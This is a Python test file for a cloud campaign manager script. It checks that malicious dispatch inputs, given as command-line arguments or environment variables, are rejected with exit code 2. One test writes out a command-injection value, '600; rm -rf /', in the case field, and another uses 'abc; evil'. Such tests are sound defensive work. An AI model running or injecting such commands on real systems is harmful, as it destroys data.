def test_main_returns_2_on_invalid_dispatch_input(monkeypatch, capsys):
    """`main()` must surface validator failures as exit code 2 (configuration
    error, distinct from 1=runtime failure) — mirrors the documented exit
    code contract in the module docstring."""
    import sys as _sys

    monkeypatch.setattr(
        _sys,
        "argv",
        [
            "cloud_campaign_manager.py",
            "--action",
            "create",
            "--case",
            "600; rm -rf /",
            "--s3-bucket",
            "fluxion-test-bucket",
        ],
    )
    rc = ccm.main()
    assert rc == 2
    err = capsys.readouterr().err
    assert "Invalid dispatch input" in err


def test_main_reads_env_var_defaults_for_user_controlled_inputs(
    monkeypatch, fake_aws_clients
):
    """Issue #3449: the workflow passes all user-controlled inputs via env
    vars. `main()` must consume them as defaults so the script can be
    invoked without `--case`/`--params`/etc. on the command line.
    """
    import sys as _sys

    monkeypatch.setenv("FLUXION_CAMPAIGN_CASE", "900")
    monkeypatch.setenv("FLUXION_CAMPAIGN_PARAMS", "R_value,thermal_mass")
    monkeypatch.setenv("FLUXION_CAMPAIGN_SWEEP_TYPE", "latin_hypercube")
    monkeypatch.setenv("FLUXION_CAMPAIGN_SAMPLES", "10")
    monkeypatch.setenv("FLUXION_S3_BUCKET", "fluxion-env-bucket")
    monkeypatch.setenv("FLUXION_S3_PREFIX", "fluxion-env/prefix")
    monkeypatch.setattr(
        _sys,
        "argv",
        ["cloud_campaign_manager.py", "--action", "create"],
    )
    rc = ccm.main()
    assert rc == 0
    # S3 mock received the env-derived bucket/prefix and a work-unit write
    s3 = fake_aws_clients["s3"]
    assert "fluxion-env-bucket" in s3.bucket_objects
    keys = list(s3.bucket_objects["fluxion-env-bucket"].keys())
    assert any(k.startswith("fluxion-env/prefix/work-units/") for k in keys), keys
    assert any(k.startswith("fluxion-env/prefix/campaigns/") for k in keys), keys


def test_main_env_var_rejected_value_returns_2(monkeypatch, capsys):
    """Defense in depth: even via env vars, malicious dispatch values must
    be rejected. This guards against an attacker who compromises
    `vars.*` (the workflow cannot restrict env vars to safe chars)."""
    import sys as _sys

    monkeypatch.setenv("FLUXION_CAMPAIGN_CASE", "abc; evil")
    monkeypatch.setenv("FLUXION_S3_BUCKET", "fluxion-test-bucket")
    monkeypatch.setattr(
        _sys,
        "argv",
        ["cloud_campaign_manager.py", "--action", "create"],
    )
    rc = ccm.main()
    assert rc == 2
    assert "Invalid dispatch input" in capsys.readouterr().err
